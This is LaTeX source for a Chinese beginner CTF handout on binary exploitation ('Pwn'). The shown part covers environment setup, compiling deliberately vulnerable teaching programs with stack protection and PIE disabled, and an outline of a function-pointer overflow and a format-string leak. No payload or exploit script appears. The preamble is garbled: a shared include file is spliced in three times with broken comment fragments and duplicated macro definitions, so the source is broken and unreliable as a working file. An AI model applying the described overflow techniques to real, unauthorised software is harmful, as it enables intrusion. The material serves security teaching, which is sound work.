% ===========================================================================
% handout-pwn.tex —— CTF 网络安全入门：Pwn 专攻版
% 重构依据：STYLE-SPEC.md（统一结构 / 题面卡 / 逐题带做 / 截图流水线 / 验收指标）
% 本册约定：只使用真实执行产生的截图与真实 flag；平台页面不伪造截图。
% ===========================================================================
\documentclass[UTF8,12pt,oneside]{ctexbook}
% handout-common.tex —— 五本讲义共享的导言区与排版宏
% 所有 handout-*.tex 通过 % handout-common.tex —— 五本讲义共享的导言区与排版宏
% 所有 handout-*.tex 通过 % handout-common.tex —— 五本讲义共享的导言区与排版宏
% 所有 handout-*.tex 通过 \input{handout-common} 引入本文件。
% 【重要】此文件为统一规范，任何单本讲义不得修改它。
% ===========================================================================
\usepackage[a4paper,left=18mm,right=18mm,top=18mm,bottom=18mm,
  includeheadfoot,headheight=15pt,headsep=4mm,footskip=10mm]{geometry}
\usepackage{amsmath,amssymb,booktabs,longtable,array,enumitem,listings,xcolor,hyperref,fancyhdr,graphicx}
\graphicspath{{figures/}}
\hypersetup{hidelinks,pdfauthor={CTF 培训资料}}

\setlength{\parindent}{2em}
\setlength{\parskip}{0.25em}
\emergencystretch=3em
\setlist{itemsep=0.15em,topsep=0.25em}
\lstset{basicstyle=\ttfamily\small,breaklines=true,columns=fullflexible,keepspaces=true,
  showstringspaces=false,frame=single,framerule=0.3pt,xleftmargin=0.4em,xrightmargin=0.4em}

% ---- 页眉页脚 -------------------------------------------------------------
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{CTF 网络安全入门}
\fancyhead[R]{\thehandoutmark}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.3pt}
\newcommand{\thehandoutmark}{讲义}
% 用法（写在导言区）：\handoutmark{Web 专攻版}
\newcommand{\handoutmark}[1]{\renewcommand{\thehandoutmark}{#1}}
\newcommand{\booktitle}[1]{\hypersetup{pdftitle={#1}}}

% ---- 正文辅助宏 -----------------------------------------------------------
\newcommand{\goal}[1]{\noindent\textbf{本章目标：}#1\par}
\newcommand{\code}[1]{\texttt{#1}}
\newcommand{\kw}[1]{\textbf{#1}}
\newcommand{\flagbox}[1]{\par\noindent{\setlength{\fboxsep}{4pt}\fbox{\textbf{flag：}\texttt{#1}}}\par}
% 题面卡中的字段行：\field{附件}{...}
\newcommand{\field}[2]{\par\noindent\textbf{#1：}#2\par}

% ---- 信息框（一句话记忆 / 常见误区 / 排错指南 / 小技巧）--------------------
\newsavebox{\ibox}
\newenvironment{infobox}[1]
  {\par\medskip\begin{lrbox}{\ibox}\begin{minipage}{0.95\linewidth}\textbf{#1}\par\smallskip\hrule\smallskip}
  {\end{minipage}\end{lrbox}\noindent\fbox{\usebox{\ibox}}\par\medskip}
\newcommand{\memory}[1]{\begin{infobox}{一句话记忆}#1\end{infobox}}
\newcommand{\pitfall}[1]{\begin{infobox}{常见误区}#1\end{infobox}}
\newcommand{\debugtip}[1]{\begin{infobox}{排错指南}#1\end{infobox}}
\newcommand{\tip}[1]{\begin{infobox}{小技巧}#1\end{infobox}}

% ---- 题面卡 ---------------------------------------------------------------
% \begin{challenge}{题 R1：一句话标题} ... \field{...}{...} ... \end{challenge}
\newenvironment{challenge}[1]
  {\par\medskip\begin{lrbox}{\ibox}\begin{minipage}{0.95\linewidth}{\large\bfseries #1}\par\smallskip\hrule\smallskip}
  {\end{minipage}\end{lrbox}\noindent\fbox{\usebox{\ibox}}\par\medskip}

% ---- 插图 -----------------------------------------------------------------
% \shot[宽度比例]{文件名}{图注}{标签}   引用：\figref{标签}
\newcommand{\shot}[4][0.96]{%
  \begin{figure}[htbp]\centering
  \includegraphics[width=#1\linewidth]{#2}%
  \caption{#3}\label{fig:#4}\end{figure}}
\newcommand{\figref}[1]{图~\ref{fig:#1}}

\endinput
 引入本文件。
% 【重要】此文件为统一规范，任何单本讲义不得修改它。
% ===========================================================================
\usepackage[a4paper,left=18mm,right=18mm,top=18mm,bottom=18mm,
  includeheadfoot,headheight=15pt,headsep=4mm,footskip=10mm]{geometry}
\usepackage{amsmath,amssymb,booktabs,longtable,array,enumitem,listings,xcolor,hyperref,fancyhdr,graphicx}
\graphicspath{{figures/}}
\hypersetup{hidelinks,pdfauthor={CTF 培训资料}}

\setlength{\parindent}{2em}
\setlength{\parskip}{0.25em}
\emergencystretch=3em
\setlist{itemsep=0.15em,topsep=0.25em}
\lstset{basicstyle=\ttfamily\small,breaklines=true,columns=fullflexible,keepspaces=true,
  showstringspaces=false,frame=single,framerule=0.3pt,xleftmargin=0.4em,xrightmargin=0.4em}

% ---- 页眉页脚 -------------------------------------------------------------
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{CTF 网络安全入门}
\fancyhead[R]{\thehandoutmark}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.3pt}
\newcommand{\thehandoutmark}{讲义}
% 用法（写在导言区）：\handoutmark{Web 专攻版}
\newcommand{\handoutmark}[1]{\renewcommand{\thehandoutmark}{#1}}
\newcommand{\booktitle}[1]{\hypersetup{pdftitle={#1}}}

% ---- 正文辅助宏 -----------------------------------------------------------
\newcommand{\goal}[1]{\noindent\textbf{本章目标：}#1\par}
\newcommand{\code}[1]{\texttt{#1}}
\newcommand{\kw}[1]{\textbf{#1}}
\newcommand{\flagbox}[1]{\par\noindent{\setlength{\fboxsep}{4pt}\fbox{\textbf{flag：}\texttt{#1}}}\par}
% 题面卡中的字段行：\field{附件}{...}
\newcommand{\field}[2]{\par\noindent\textbf{#1：}#2\par}

% ---- 信息框（一句话记忆 / 常见误区 / 排错指南 / 小技巧）--------------------
\newsavebox{\ibox}
\newenvironment{infobox}[1]
  {\par\medskip\begin{lrbox}{\ibox}\begin{minipage}{0.95\linewidth}\textbf{#1}\par\smallskip\hrule\smallskip}
  {\end{minipage}\end{lrbox}\noindent\fbox{\usebox{\ibox}}\par\medskip}
\newcommand{\memory}[1]{\begin{infobox}{一句话记忆}#1\end{infobox}}
\newcommand{\pitfall}[1]{\begin{infobox}{常见误区}#1\end{infobox}}
\newcommand{\debugtip}[1]{\begin{infobox}{排错指南}#1\end{infobox}}
\newcommand{\tip}[1]{\begin{infobox}{小技巧}#1\end{infobox}}

% ---- 题面卡 ---------------------------------------------------------------
% \begin{challenge}{题 R1：一句话标题} ... \field{...}{...} ... \end{challenge}
\newenvironment{challenge}[1]
  {\par\medskip\begin{lrbox}{\ibox}\begin{minipage}{0.95\linewidth}{\large\bfseries #1}\par\smallskip\hrule\smallskip}
  {\end{minipage}\end{lrbox}\noindent\fbox{\usebox{\ibox}}\par\medskip}

% ---- 插图 -----------------------------------------------------------------
% \shot[宽度比例]{文件名}{图注}{标签}   引用：\figref{标签}
\newcommand{\shot}[4][0.96]{%
  \begin{figure}[htbp]\centering
  \includegraphics[width=#1\linewidth]{#2}%
  \caption{#3}\label{fig:#4}\end{figure}}
\newcommand{\figref}[1]{图~\ref{fig:#1}}

\endinput
 引入本文件。
% 【重要】此文件为统一规范，任何单本讲义不得修改它。
% ===========================================================================
\usepackage[a4paper,left=18mm,right=18mm,top=18mm,bottom=18mm,
  includeheadfoot,headheight=15pt,headsep=4mm,footskip=10mm]{geometry}
\usepackage{amsmath,amssymb,booktabs,longtable,array,enumitem,listings,xcolor,hyperref,fancyhdr,graphicx}
\graphicspath{{figures/}}
\hypersetup{hidelinks,pdfauthor={CTF 培训资料}}

\setlength{\parindent}{2em}
\setlength{\parskip}{0.25em}
\emergencystretch=3em
\setlist{itemsep=0.15em,topsep=0.25em}
\lstset{basicstyle=\ttfamily\small,breaklines=true,columns=fullflexible,keepspaces=true,
  showstringspaces=false,frame=single,framerule=0.3pt,xleftmargin=0.4em,xrightmargin=0.4em}

% ---- 页眉页脚 -------------------------------------------------------------
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{CTF 网络安全入门}
\fancyhead[R]{\thehandoutmark}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.3pt}
\newcommand{\thehandoutmark}{讲义}
% 用法（写在导言区）：\handoutmark{Web 专攻版}
\newcommand{\handoutmark}[1]{\renewcommand{\thehandoutmark}{#1}}
\newcommand{\booktitle}[1]{\hypersetup{pdftitle={#1}}}

% ---- 正文辅助宏 -----------------------------------------------------------
\newcommand{\goal}[1]{\noindent\textbf{本章目标：}#1\par}
\newcommand{\code}[1]{\texttt{#1}}
\newcommand{\kw}[1]{\textbf{#1}}
\newcommand{\flagbox}[1]{\par\noindent{\setlength{\fboxsep}{4pt}\fbox{\textbf{flag：}\texttt{#1}}}\par}
% 题面卡中的字段行：\field{附件}{...}
\newcommand{\field}[2]{\par\noindent\textbf{#1：}#2\par}

% ---- 信息框（一句话记忆 / 常见误区 / 排错指南 / 小技巧）--------------------
\newsavebox{\ibox}
\newenvironment{infobox}[1]
  {\par\medskip\begin{lrbox}{\ibox}\begin{minipage}{0.95\linewidth}\textbf{#1}\par\smallskip\hrule\smallskip}
  {\end{minipage}\end{lrbox}\noindent\fbox{\usebox{\ibox}}\par\medskip}
\newcommand{\memory}[1]{\begin{infobox}{一句话记忆}#1\end{infobox}}
\newcommand{\pitfall}[1]{\begin{infobox}{常见误区}#1\end{infobox}}
\newcommand{\debugtip}[1]{\begin{infobox}{排错指南}#1\end{infobox}}
\newcommand{\tip}[1]{\begin{infobox}{小技巧}#1\end{infobox}}

% ---- 题面卡 ---------------------------------------------------------------
% \begin{challenge}{题 R1：一句话标题} ... \field{...}{...} ... \end{challenge}
\newenvironment{challenge}[1]
  {\par\medskip\begin{lrbox}{\ibox}\begin{minipage}{0.95\linewidth}{\large\bfseries #1}\par\smallskip\hrule\smallskip}
  {\end{minipage}\end{lrbox}\noindent\fbox{\usebox{\ibox}}\par\medskip}

% ---- 插图 -----------------------------------------------------------------
% \shot[宽度比例]{文件名}{图注}{标签}   引用：\figref{标签}
\newcommand{\shot}[4][0.96]{%
  \begin{figure}[htbp]\centering
  \includegraphics[width=#1\linewidth]{#2}%
  \caption{#3}\label{fig:#4}\end{figure}}
\newcommand{\figref}[1]{图~\ref{fig:#1}}

\endinput

% Keep instructional figures beside the step that introduces them.
\usepackage{float}
\renewcommand{\shot}[4][0.92]{%
  \begin{figure}[H]\centering
  \includegraphics[width=#1\linewidth]{#2}%
  \caption{#3}\label{fig:#4}\end{figure}}
% 字形修正：① ② ③ 等序号在西文字体中缺字形，声明为 CJK 字符类，改由中文字体渲染，
% 避免这些字符在 PDF 里被吞掉（与 web/crypto/reverse 三册保持一致的处理）。
\xeCJKDeclareCharClass{CJK}{"2460 -> "24FF, "2194 -> "2195, "2605 -> "2606, "03B1 -> "03C9}
\handoutmark{Pwn 专攻版}
\booktitle{CTF 网络安全入门：Pwn专攻版}

\begin{document}
\frontmatter

\begin{titlepage}
\centering
\vspace*{32mm}
{\Huge\bfseries CTF 网络安全入门：Pwn 专攻版\par}
\vspace{9mm}
{\LARGE 从输入字节走到控制流\par}
\vspace{5mm}
{\large 零基础版 · 题目 P0--P4（含玄机 296 pwn-ezpwn）\par}
\vspace{14mm}
{\large 本册特色\par}
\vspace{3mm}
\begin{minipage}{0.86\linewidth}
\begin{itemize}
\item 零基础预备篇：先在 WSL 里把工具链跑通、编译出第一个练习程序，再讲内存布局；
\item 每题一张标准题面卡：给什么、要什么、交付物、考点、前置知识、难度；
\item 逐题图解带做：每一步命令配真实终端截图（WSL 实录），看到图就能照着做；
\item 全部 28 张终端截图来自真实执行（termcap 实录 + 终端渲染），另有 4 张原理示意图；
\item 所有本地 flag 来自本地程序的真实输出；平台题 296 的 flag 来自已授权在线实例的真实回显；
\item 附命令速查表、术语表、自测题与完整推演。
\end{itemize}
\end{minipage}
\vfill
{\large 适用对象：学过 Python、C 和命令行、第一次接触 CTF 的同学\par}
\vspace{4mm}
{\large 版本：2026 年 9 月\par}
\end{titlepage}

\chapter*{使用说明}
\addcontentsline{toc}{chapter}{使用说明}

\section*{这本讲义带你做什么}
Pwn 方向研究的是“程序在内存里怎么运行、怎么被一段超长或格式特殊的输入带偏”。它比 Web、Crypto 更贴近机器底层，所以本册不急着给你 payload（攻击载荷，指送进程序、用来触发漏洞的那段字节），而是先陪你做三件事：\kw{把环境装好}、\kw{把内存布局看清楚}、\kw{把每一步的“为什么”说清楚}。本地用 5 道自己编译的题（P0--P4）练手，最后用玄机平台的一道真题（296 pwn-ezpwn）走一遍真实在线利用链。做完之后，你应当能自己回答三个问题：这段越界写入改到了哪个字段？地址该按什么字节顺序写？这个漏洞被哪一种保护机制挡住了？

\section*{学习路线图}
\begin{enumerate}
\item \kw{第 1 章 零基础预备}：装好 WSL/Ubuntu、确认 \code{gcc} 等工具都在，编译出第一个练习程序，跑通第一条命令，确认你能看到和讲义一样的输出；
\item \kw{第 2 章 Pwn 基础知识铺垫}：什么是 Pwn、进程内存布局、寄存器与函数调用、结构体与偏移、越界写入为什么能改控制流、字节序、格式串原理、保护机制总览。这章不写题，但每一小节都对应后面某道题的某一步；
\item \kw{第 3 章 Pwn 工具箱}：\code{file}、\code{readelf}、\code{nm}、\code{objdump}、\code{strings}、\code{xxd}、\code{python3}+\code{struct}、\code{gcc}，每个工具配真实输出截图；
\item \kw{第 4 章 题目：题面卡与逐题图解带做}：每题一张题面卡，卡后面直接就是这道题的解题步骤，按“读题与思路 → 分步操作与观察 → 结果与核对 → 为什么会成功 → 排错指南 → 变式练习”推进。建议先遮住解题步骤自己做一遍，卡住再看；
\item \kw{第 6、7 章}：复盘知识地图与易错清单，做自测题并对照完整推演；
\item \kw{附录}：玄机平台真题状态与提交 checklist、命令速查表、术语表。
\end{enumerate}

\section*{怎么用这本讲义}
\begin{itemize}
\item \kw{先看图再敲命令}：每张终端截图都标了这一步在做什么。图片里的命令在 WSL/Ubuntu 里执行，工作目录是 \code{\textasciitilde/pwn-lab}（先把 \code{labs/pwn/} 的两份源码复制过去，第 1 章会交代）；看文件、跑脚本这类操作也可以在 Windows PowerShell 里做，正文会标注。
\item \kw{每步都问“为什么”}：正文里每条命令后面都紧跟一句“这一步是为了……”。能自己说出为什么，才算会做。
\item \kw{核对不能省}：解出 flag 后一定要做“结果与核对”里的独立验证。程序打印出 \code{flag\{...\}} 不等于答案正确。
\item \kw{变式练习是升级关}：做对原题只是及格，做完变式才算掌握。
\item \kw{不依赖调试器}：本册不使用 \code{gdb}（WSL 里默认没有装）。偏移用 \code{offsetof} 小程序实测，地址用 \code{nm} 读当前产物，调用点用 \code{objdump} 看反汇编——不开调试器同样能把每一步确认清楚，第 3 章会说明为什么这样够用。
\end{itemize}

\section*{安全声明}
所有实验只针对本资料附带的程序、本资料附带的靶场，或平台上明确授权给你的那道题的实例；不要把命令、payload 或脚本用于未经授权的系统。玄机平台入口为 \url{https://xj.edisec.net/}，授课时由教师提供个人或课程账号，讲义不保存账号口令。平台题面、价格与界面可能变化，始终以当前题目详情页为准。

\section*{截图说明（真实终端实录 vs 原理示意图）}
本册插图分两类，看标题栏就能分辨：
\begin{itemize}
\item \kw{真实终端实录截图}（共 28 张：\code{fig-pwn-01}--\code{fig-pwn-18}，第 4 章细化解题步骤新增的 \code{fig-pwn-22}--\code{fig-pwn-26}，167 题的 \code{fig-pwn-27}--\code{fig-pwn-29}，以及 514 题的 \code{fig-pwn-31}--\code{fig-pwn-32}）：先用 \code{tools/termcap.py} 在真实 WSL/Ubuntu 里执行命令并记录“命令 + 真实输出”，再用 \code{tools/term2png.py} 渲染成终端窗口图。每张图对应的原始实录保存在 \code{figures/raw/} 下的同名 \code{.txt} 文件里，可自行逐行核对。图里的每个地址、每行长输出都来自真实执行，没有手打补全。
\item \kw{原理示意图}（共 4 张，文件名 \code{fig-pwn-19}--\code{fig-pwn-21} 与 \code{fig-pwn-30}）：用 matplotlib 绘制，画的是\kw{结构关系}（内存分区、栈帧、格式串取参方向、解题流程、MQTT 攻击链的时间窗），不是运行时截屏。
\end{itemize}
有一个细节先说明：个别实录里会出现一行 \code{wsl: Failed to start the systemd user session}。这是 WSL 启动某个可选会话时的无害提示，不影响 \code{gcc}、\code{readelf} 等命令的结果，截图里照实录保留。玄机平台的网页没有伪造截图，涉及平台状态的地方用文字表格说明。

\section*{术语约定}
每个术语第一次出现时都会用白话解释，之后直接使用。最容易混淆的三个词先放在这里：
\begin{itemize}
\item \kw{字节}：计算机存储的一个 0--255 的数，是数据的最小常用单位；内存里的一切（变量、地址、代码）最终都是字节。
\item \kw{地址}：内存中某个位置的门牌号，本质是一个整数（Pwn 里常说 64 位，就是 8 个字节）。
\item \kw{偏移}：从某个起点数过去有多少个字节。例如“\code{next} 的偏移是 24”意思是它从结构体开头数第 24 个字节开始。
\end{itemize}

\tableofcontents
\mainmatter

% ===========================================================================
\chapter{零基础预备：WSL 环境、命令行与工具安装}
% ===========================================================================
\goal{装好 WSL/Ubuntu 与 x86-64 工具链，把 \code{labs/pwn} 的两份源码复制到练习目录并编译成功；看懂 \code{gcc} 那条“越界警告”到底在提示什么；建立“先建基线、再改一个变量”的做题习惯。}

\section{Pwn 题长什么样}
Pwn 题的题面通常很短：给你一个 Linux 可执行程序（或者一个能连上去的在线服务），里面藏着一段不安全的代码，要你构造一段输入让它做出“本来不该做”的事，最后吐出 \code{flag\{...\}}。它和另外四个方向最大的不同是：\kw{你面对的是一个正在运行的程序内存}，而不是一段文本、一份密文或一张图片。

本册在本地准备了 5 道小题，全都在我们自己写的 C 源码里，故意留下教学用的漏洞：
\begin{itemize}
\item \kw{P0/P1}：\code{overflow.c}，一个 24 字节的名字数组紧挨着一个函数指针，程序却要读 32 字节——多出来的 8 字节正好盖住函数指针；
\item \kw{P2}：\code{struct.pack} 把地址按小端序打成字节；
\item \kw{P3}：\code{format.c}，程序把用户输入当作 printf 的“格式说明”，因此能被 \code{\%s} 读出秘密；
\item \kw{P4}：把同一份源码换成默认编译参数，观察保护机制改变了哪一步。
\end{itemize}
最后一道是玄机平台的真题 296 pwn-ezpwn，需要先启动授权实例、读到当次可用的 HOST/PORT 才能复现。

这里说的\kw{在线服务}，本质是对方机器上跑着一个程序、在某个\kw{端口}上等着别人连进来：只要知道 \code{HOST}（主机名或 IP）和 \code{PORT}（端口号），就能建立一条\kw{连接}，然后像对话一样\kw{一行一行发命令、读回显}——这就是后端常说的 \kw{socket（套接字）交互}。Python 标准库里的 \code{socket} 就是干这个的：\code{socket.create\_connection((HOST, PORT))} 连上服务，\code{sock.sendall(b"ls\textbackslash n")} 发过去一行（末尾的换行相当于敲回车），\code{sock.recv(8192)} 读回一段输出。本册 296 的脚本正是这样远程交互的（见 4.6 节），所以运行前必须先拿到当前实例的 HOST/PORT。

\memory{Pwn = 用输入改变程序的内存或控制流。第一句口诀：先看清楚数据的类型与长度，再动手。}

\section{为什么用 WSL：Pwn 的二进制在 Linux 里跑}
Pwn 的练习对象是 Linux 的可执行文件（ELF 格式）。Windows 自带的工具既不能可靠地编译出 ELF，也没有 \code{readelf}、\code{objdump} 这些查看命令，所以本册统一在 \kw{WSL}（Windows Subsystem for Linux，Windows 里的 Linux 子系统）里做实验。WSL 里跑的是真正的 Ubuntu，命令和教程、平台题环境完全一致，能避免“我这边结果和讲义不一样”。

具体分工是：\kw{编译、运行、查看二进制}都在 WSL 里做；\kw{看文件内容、写 Python 脚本}既可以在 WSL 里做，也可以在 Windows PowerShell 里做。每段命令都会标注在哪里执行。本册用到的 WSL 发行版名写成 \code{Ubuntu-24.04}。

\section{安装与验证 WSL 工具链}
\paragraph{要装什么}
\begin{itemize}
\item \kw{WSL + Ubuntu}：在 Windows PowerShell（管理员）里执行 \code{wsl --install -d Ubuntu-24.04}，按提示重启并设置用户名口令；
\item \kw{gcc}（C 编译器）、\code{readelf}、\code{objdump}、\code{nm}、\code{strings}、\code{file}、\code{xxd}：Ubuntu 的 \code{build-essential} 与 \code{binutils} 已经自带，一般\kw{无需额外安装}。若确实缺失，一条命令补齐：\code{sudo apt install build-essential binutils xxd}；
\item \kw{python3}：Ubuntu 已自带，用来生成 payload、做字节运算。
\end{itemize}

\paragraph{验证命令}在 Windows PowerShell 里执行下面这条（把命令交给 WSL 里的 bash 跑），或者在 WSL 终端里直接逐条跑：
\begin{lstlisting}
wsl -d Ubuntu-24.04 -- bash -lc "gcc --version | head -1; python3 --version; uname -m; which gcc readelf objdump xxd nm strings file"
\end{lstlisting}
\figref{env-check} 是一次真实执行的截图。应该看到：\code{gcc} 是 13.3.0（Ubuntu 13.3.0-6ubuntu2\textasciitilde24.04.1）、\code{Python 3.12.3}、\code{x86\_64}（说明是 64 位），以及七个工具的绝对路径（都在 \code{/usr/bin/} 下）。这一屏确认了后面所有实验的前提：\kw{编译器、解释器、架构、查看工具四件事都就绪}。图里那一行 \code{wsl: Failed to start the systemd user session} 是无害提示，可以忽略。

\shot[0.95]{fig-pwn-01-env-check.png}{第 1 章 WSL 工具链验证：gcc 13.3.0、Python 3.12.3、x86\_64，以及 gcc/readelf/objdump/xxd/nm/strings/file 七个工具的位置（真实终端实录，WSL）}{env-check}

\memory{看到和讲义一样的输出，才说明环境对了；\code{which} 列得出七个工具 = 本册所有查看命令都能用。}

\section{准备练习目录并编译第一个程序}
源码放在本资料的 \code{labs/pwn/} 下。实录里的工作目录是 WSL 家目录下的 \code{\textasciitilde/pwn-lab}，所以第一步是建好这个练习目录，再把四个文件复制过去（两份题目源码 + 两份后面要用的辅助文件）。这样做的好处是：练习目录和资料目录分开，即使你在练习目录里生成 \code{payload.bin} 等临时文件，也不会弄脏 \code{labs/}（本资料规定 \code{labs/} 只读）。

\pitfall{动手前先把“资料路径”换成你自己的。}下面命令里的 \code{你的用户名} 就是 Windows 里 \code{C:\textbackslash{}Users\textbackslash{}} 下面那一层文件夹名（打开“此电脑”就能看到）。资料包在 WSL 里的完整路径是 \code{/mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包}，其中前缀 \code{/mnt/c/} 是 WSL 拿 Windows C 盘的挂载点。不确定用户名就在 WSL 里执行 \code{ls /mnt/c/Users/}，列出来的就是可用的用户名。

在 WSL 里执行：

\begin{lstlisting}
mkdir -p ~/pwn-lab
cp /mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包/labs/pwn/overflow.c \
   /mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包/labs/pwn/format.c \
   /mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包/labs/pwn/layout.c \
   /mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包/labs/pwn/make_payload.py ~/pwn-lab/
cd ~/pwn-lab && gcc -O0 -fno-stack-protector -no-pie -o overflow overflow.c
cd ~/pwn-lab && gcc -O0 -o format format.c
cd ~/pwn-lab && file overflow format
\end{lstlisting}
第一条 \code{mkdir -p} 不能省：练习目录还不存在时，后面的 \code{cp} 会直接报 \code{No such file or directory}。复制完用 \code{ls \textasciitilde/pwn-lab} 确认四个文件都在，再继续编译。

\figref{build} 是真实执行结果。要重点看三样：
\begin{enumerate}[label=\arabic*.]
\item 第二条命令的编译输出里有一条警告：\code{‘read’ writing 32 bytes into a region of size 24 overflows the destination}。这是编译器\kw{主动告诉你}：源码第 18 行让 \code{read} 往一个 24 字节的对象里写 32 字节。它不是“编译失败”，而是“这个教学漏洞被编译器发现了”——这正是本题的考点所在。
\item \code{file overflow format} 显示两份产物：\code{overflow} 是 \code{ELF 64-bit LSB executable}（\code{EXEC}），\code{format} 是 \code{ELF 64-bit LSB pie executable}（\code{PIE}）。前者用了 \code{-no-pie} 所以是固定地址，后者没用所以是 PIE 随机地址——第 2 章会讲这两个词的区别。
\item 两份产物都写着 \code{not stripped}，意思是\kw{符号表还在}，因此后面 \code{nm} 能直接读出函数地址。
\end{enumerate}

\shot[0.95]{fig-pwn-02-build.png}{第 1 章 准备与编译：复制源码到 \textasciitilde/pwn-lab、两条 gcc 命令、overflow 的越界警告，以及 file 对比 EXEC 与 PIE（真实终端实录，WSL）}{build}

\paragraph{为什么 warning 里那句提示这么重要}Pwn 的第一条线索往往就来自编译器或工具的“抱怨”。编译器知道 \code{sizeof session} 是 32，而 \code{name} 只有 24，于是提醒你“多写了 8 字节”。这 8 字节就是 P1 的全部漏洞。学会读这类警告，比背 payload 有用得多。

\debugtip{
\begin{itemize}
\item \code{cp} 报 \code{No such file or directory}：资料根目录路径拼错了，先用 \code{ls /mnt/c/Users/你的用户名/Desktop/} 确认目录名；
\item \code{gcc: command not found}：Ubuntu 里补装 \code{build-essential}，或确认你在 WSL 而不是 PowerShell 里跑 \code{gcc}；
\item \code{\textasciitilde/pwn-lab: No such file or directory}：家目录下还没有这个目录，先 \code{mkdir -p \textasciitilde/pwn-lab} 再复制；
\item 警告不见了：说明你没在 WSL 的 \code{\textasciitilde/pwn-lab} 目录里编译，或者复制过去的是旧版源码；先 \code{pwd} 和 \code{cat overflow.c | head} 核对。
\end{itemize}}

\section{读懂那两条 gcc 命令}
\code{overflow} 的编译命令是 \code{gcc -O0 -fno-stack-protector -no-pie -o overflow overflow.c}，四个参数各管一件事：
\begin{itemize}
\item \code{-O0}：不优化。优化会把变量挪来挪去、内联函数，让内存布局难以预测；教学时先关掉；
\item \code{-fno-stack-protector}：关闭栈保护（Canary）。否则越界写会先破坏“金丝雀”触发程序主动退出；
\item \code{-no-pie}：关掉位置无关可执行文件，让代码段地址固定，\code{nm} 读到的地址在同一次编译产物里可直接用；
\item \code{-o overflow overflow.c}：输出文件名与源文件名。
\end{itemize}
\code{format} 的命令是 \code{gcc -O0 -o format format.c}，只关了优化——因为这道题不覆盖地址，只需要一个能读到秘密字符串的格式串漏洞，用默认保护即可。\kw{两题用了不同参数，是因为考点不同}：一个考控制流覆盖，一个考格式串泄漏。

\pitfall{不要以为“没加保护”是好事。本册的教学参数\kw{故意}关掉部分保护，只为让内存布局稳定、现象可复现；真实加固程序默认是开启 PIE 与栈保护的。P4 会让你亲手对比开/关的差别。}

\section{目录与文件约定}
书中的相对路径以本资料根目录为当前目录；实录里的工作目录是 WSL 的 \code{\textasciitilde/pwn-lab}。本册用到的文件：
\begin{itemize}
\item \code{labs/pwn/overflow.c}：P0/P1 的源码（含结构体与函数指针）；
\item \code{labs/pwn/format.c}：P3 的源码（含危险的 \code{printf(input, secret)}）；
\item \code{\textasciitilde/pwn-lab/}：实录里编译产物与辅助脚本所在目录（\code{overflow}、\code{format}、\code{layout.c}、\code{make\_payload.py}、\code{endian\_demo.py}、\code{fixed\_format.c}）；
\item \code{labs/platform/solve\_pwn\_ezpwn.py}：玄机 296 的复现脚本，需要当前实例的 HOST/PORT；
\item \code{figures/raw/}：每张终端截图对应的同名实录文本，可逐行核对。
\end{itemize}
注意：\code{labs/} 只读，不要改动里面的题目源码和附件；练习用的临时文件都放在 \code{\textasciitilde/pwn-lab} 里。

\section{第一次运行练习程序}
先跑 P1 的普通输入，建立\kw{基线}（基线就是“正常情况下的标准输出”，后面所有异常都拿来和它比）。在 WSL 里执行：
\begin{lstlisting}
cd ~/pwn-lab && echo alice | ./overflow
\end{lstlisting}
应该看到：程序先打印 \code{Name:} 提示，再打印 \code{Try again.}（因为输入太短，没碰到后面的函数指针，程序照常调用默认的 \code{normal} 函数）。再执行 \code{echo bob | ./overflow; echo exit code OK}，如果后面打印出 \code{exit code OK}，说明程序是\kw{正常退出}的——“Try again.”是正常行为，不是崩溃。这一步的意义是把“正常”钉死，第 4 章才能一眼看出“异常”。

\memory{做 Pwn 题的第一条命令永远是“跑一遍正常输入”，把标准输出记下来。没有基线，异常就看不出来。}

\section{用独立证据验证答案}
程序打印一串 \code{flag\{...\}} 只说明它输出了字符串，不等于答案正确。本册每个“结果与核对”模块都给出\kw{独立于最后那行打印}的验证方法：
\begin{itemize}
\item P0/P1：用 \code{offsetof} 小程序独立实测结构体大小与字段偏移，并核对 payload 长度为 32 字节；
\item P2：用小端打包再解包，验证地址原样还原；
\item P3：用修复版 \code{fixed\_format} 证明 \code{\%s} 在固定格式下只当普通文本；
\item P4：用 \code{file} 与 \code{readelf} 证明保护开关确实改变了产物类型；
\item 平台题最后还要看提交页面是否显示“FLAG 正确”。
\end{itemize}
写题解时也应写出从源码条件到结果的证据链，而非只附一行看似成功的输出。

% ===========================================================================
\chapter{Pwn 基础知识铺垫}
% ===========================================================================
\goal{把“什么是 Pwn、内存怎么分区、函数怎么被调用、结构体偏移怎么算、越界为什么能改控制流、地址怎么按字节写、格式串为什么危险、四种保护卡在哪一步”这八块地基打牢，每块都能对应到后面的具体题目。}

\section{什么是 Pwn：从“能改数据”到“能改控制流”}
Pwn 是 CTF 里的二进制漏洞利用方向。“Pwn”（读作“砰”）本意是把对手彻底打趴，在 CTF 语境里指\kw{利用程序自身的内存安全缺陷，让它执行出题人没打算让它执行的行为}。最常见的两种行为是：
\begin{itemize}
\item \kw{读出不该读的内容}：例如用格式串漏洞把内存里的秘密字符串打印出来（P3 就是这种）；
\item \kw{跳去不该去的地方}：例如用越界写入改掉一个函数指针，让程序跳到那个会打印 flag 的函数（P1 就是这种）。
\end{itemize}
它跟 Crypto 的差别在于：Crypto 破的是数学关系，Pwn 破的是\kw{程序的执行过程}。要破执行过程，就得先看懂程序在内存里长什么样、函数是怎么被调用的。

\section{Pwn 题在考什么}
一道 Pwn 题，无论多复杂，通常都能拆成下面四问。本册每道题的“读题与思路”都会回到这四问：
\begin{enumerate}[label=\arabic*.]
\item \kw{漏洞在哪}：哪一行代码把外部输入写进了不该写的地方（越界写、格式串、失控的指针等）；
\item \kw{我能控制什么}：我能改到哪个字段、几个字节？能读出哪块内存？
\item \kw{我要去哪里}：我是想读 flag，还是想把控制流跳到某个函数？
\item \kw{有没有拦路虎}：地址随机化（PIE/ASLR）、栈保护（Canary）、不可执行栈（NX）会不会让我的套路失效？
\end{enumerate}
本地 5 道题把第 1、2、3 问分别练一遍，P4 专门练第 4 问。

